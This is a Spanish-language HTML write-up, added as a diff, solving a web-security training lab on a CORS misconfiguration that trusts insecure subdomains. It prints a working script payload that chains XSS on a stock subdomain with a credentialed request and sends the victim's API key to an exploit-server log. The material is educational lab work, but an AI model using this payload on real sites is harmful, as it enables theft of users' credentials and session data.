@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS vulnerability with trusted insecure protocols</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            color: #e0e0e0;
+            background-color: #121212;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: auto;
+            padding: 20px;
+        }
+        h1, h2, h3 {
+            color: #ffffff;
+        }
+        h1 {
+            color: #ff6600; 
+            border-bottom: 2px solid #ff6600; 
+            padding-bottom: 10px;
+        }
+        h2 {
+            margin-top: 20px;
+            color: #ff6600; 
+            border-bottom: 1px solid #ff6600; 
+            padding-bottom: 5px;
+        }
+        p {
+            line-height: 1.6;
+            font-size: 18px; 
+            position: relative;
+            padding-left: 30px;
+        }
+        p:not(.no-symbol)::before {
+            content: ">";
+            position: absolute;
+            left: 10px;
+            color: #ff6600;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .no-symbol {
+            padding-left: 0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 10px 0;
+        }
+        code {
+            background-color: #333;
+            color: #f0f0f0;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        pre {
+            background-color: #2d2d2d;
+            color: #f8f8f2;
+            border: 1px solid #44475a;
+            border-radius: 8px;
+            padding: 8px;
+            font-family: Consolas, Monaco, "Courier New", monospace;
+            overflow-x: auto;
+            position: relative;
+            white-space: pre-wrap;
+            margin: 0;
+        }
+        .copy-button {
+            position: absolute;
+            top: 5px;
+            right: 10px;
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-size: 14px;
+            border-radius: 5px;
+        }
+        .copy-button:hover {
+            background-color: #e65c00;
+        }
+        .copy-message {
+            position: absolute;
+            top: 5px;
+            right: 80px;
+            color: #28a745;
+            font-size: 14px;
+            font-weight: bold;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CORS vulnerability with trusted insecure protocols</h1>
+        <p class="no-symbol"><strong>Autor:</strong> h4ckgiver</p>
+
+        <div class="section" id="descripcion-del-laboratorio">
+            <h2>Descripción del Laboratorio</h2>
+            <p class="no-symbol">Este sitio web tiene una configuración de CORS insegura, confía en todos los subdominios independientemente del protocolo.</p>
+        </div>
+
+        <div class="section" id="metodologia">
+            <h2>Resolución</h2>
+            <p>Nos logeamos con las credenciales <code>wiener:peter</code> con burpsuite en escucha.</p>
+            <img src="login.png" alt="Descripción de la imagen">
+            <p>En el HTTP history vemos una petición <code>/accountDetails</code> la cual contiene la apikey de nuestra sesión. Observamos que la cabecera Access-Control-Allow-Credentials está seteada en <code>true</code>.</p>
+            <img src="apikey.png">
+            <p>Agregamos la cabecera Origin apuntando hacia un subdominio del id de nuestro laboratorio y vemos que su contenido se refleja en la cabecera.</p>
+            <img src="origin.png">
+            <p>Al comprobar el stock de un producto, vemos que uno de los parámetros es vulnerable a XSS.</p>
+            <img src="xss.png">
+            <p>Ahora montamos el ataque, nos dirigimos al exploit-server y enviamos el siguiente payload a la victima.</p>
+            <pre>
+<button class="copy-button" onclick="copyCode()">Copiar</button>
+<span class="copy-message" id="copyMessage">¡Copiado!</span>
+<code id="code-block">
+&lt;script&gt;
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&storeId=1"
+&lt;/script&gt;
+</code>
+            </pre>
+            <p>Si comprobamos los logs, vemos que hemos recibido la apikey de la victima, administrator. Si no funciona, probar el ataque varias veces.</p>
+            <img src="logs.png">
+            <p>Enviamos el apikey de la victima y resolvemos el laboratorio!</p>
+            <img src="solution.png">
+            <img src="solved.png">
+        </div>
+
+        <div class="footer">
+            <p class="no-symbol">&copy; 2025 h4ckgiver</p>
+        </div>
+    </div>
+
+    <script>
+        function copyCode() {
+            const code = document.getElementById("code-block").innerText.trim();
+            const copyMessage = document.getElementById("copyMessage");
+            navigator.clipboard.writeText(code).then(() => {
+                copyMessage.style.display = "inline";
+                setTimeout(() => {
+                    copyMessage.style.display = "none";
+                }, 1000);
+            }).catch(err => {
+                console.error("Error al copiar el código: ", err);
+            });
+        }
+    </script>
+</body>
+</html>
